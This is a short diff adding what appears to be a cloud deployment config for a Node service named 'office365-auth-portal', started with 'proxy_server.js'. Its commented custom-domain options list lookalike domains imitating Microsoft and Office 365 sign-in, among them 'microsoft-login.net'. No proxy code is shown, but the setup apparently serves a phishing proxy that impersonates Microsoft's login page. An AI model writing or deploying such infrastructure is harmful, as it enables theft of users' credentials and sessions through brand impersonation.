@@ -1,0 +1,16 @@
+services:
+  - type: web
+    name: office365-auth-portal
+    env: node
+    plan: free
+    buildCommand: npm install
+    startCommand: node proxy_server.js
+    healthCheckPath: /health
+    envVars:
+      - key: NODE_ENV
+        value: production
+    # Custom domain options (uncomment to use)
+    # customDomains:
+    #   - name: office365-auth.com
+    #   - name: microsoft-login.net
+    #   - name: auth-portal-784-13981.com
